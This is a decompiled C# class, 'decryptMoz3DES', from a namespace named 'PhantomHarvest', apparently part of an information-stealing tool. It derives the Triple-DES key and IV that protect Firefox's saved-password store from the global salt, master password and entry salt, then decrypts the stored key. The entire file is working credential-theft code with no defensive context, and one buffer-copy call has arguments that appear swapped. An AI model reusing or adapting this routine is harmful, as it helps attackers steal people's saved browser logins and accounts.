using System;
using System.Security.Cryptography;

namespace PhantomHarvest.Helper
{
	// Token: 0x02000022 RID: 34
	public class decryptMoz3DES
	{
		// Token: 0x17000005 RID: 5
		// (get) Token: 0x060000AC RID: 172 RVA: 0x00008BEB File Offset: 0x00006DEB
		// (set) Token: 0x060000AD RID: 173 RVA: 0x00008BF3 File Offset: 0x00006DF3
		private byte[] cipherText { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x060000AE RID: 174 RVA: 0x00008BFC File Offset: 0x00006DFC
		// (set) Token: 0x060000AF RID: 175 RVA: 0x00008C04 File Offset: 0x00006E04
		private byte[] GlobalSalt { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x060000B0 RID: 176 RVA: 0x00008C0D File Offset: 0x00006E0D
		// (set) Token: 0x060000B1 RID: 177 RVA: 0x00008C15 File Offset: 0x00006E15
		private byte[] MasterPassword { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x060000B2 RID: 178 RVA: 0x00008C1E File Offset: 0x00006E1E
		// (set) Token: 0x060000B3 RID: 179 RVA: 0x00008C26 File Offset: 0x00006E26
		private byte[] EntrySalt { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x060000B4 RID: 180 RVA: 0x00008C2F File Offset: 0x00006E2F
		// (set) Token: 0x060000B5 RID: 181 RVA: 0x00008C37 File Offset: 0x00006E37
		public byte[] Key { get; private set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x060000B6 RID: 182 RVA: 0x00008C40 File Offset: 0x00006E40
		// (set) Token: 0x060000B7 RID: 183 RVA: 0x00008C48 File Offset: 0x00006E48
		public byte[] IV { get; private set; }

		// Token: 0x060000B8 RID: 184 RVA: 0x00008C51 File Offset: 0x00006E51
		public decryptMoz3DES(byte[] cipherText, byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
		{
			this.cipherText = cipherText;
			this.GlobalSalt = GlobalSalt;
			this.MasterPassword = MasterPassword;
			this.EntrySalt = EntrySalt;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00008C78 File Offset: 0x00006E78
		public byte[] Compute()
		{
			byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
			Buffer.BlockCopy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
			Buffer.BlockCopy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
			byte[] array2 = new SHA1Managed().ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
			Buffer.BlockCopy(array2, 0, array3, 0, array2.Length);
			Buffer.BlockCopy(this.EntrySalt, 0, array3, this.EntrySalt.Length, array2.Length);
			byte[] key = new SHA1Managed().ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
			for (int i = this.EntrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
				Buffer.BlockCopy(array7, 0, array8, 0, array7.Length);
				Buffer.BlockCopy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.Key = new byte[24];
			for (int j = 0; j < this.Key.Length; j++)
			{
				this.Key[j] = array10[j];
			}
			this.IV = new byte[8];
			int num = this.IV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.IV.Length; k--)
			{
				this.IV[num] = array10[k];
				num--;
			}
			Array sourceArray = TripleDESHelper.DESCBCDecryptorByte(this.Key, this.IV, this.cipherText);
			byte[] array11 = new byte[24];
			Array.Copy(sourceArray, array11, array11.Length);
			return array11;
		}
	}
}
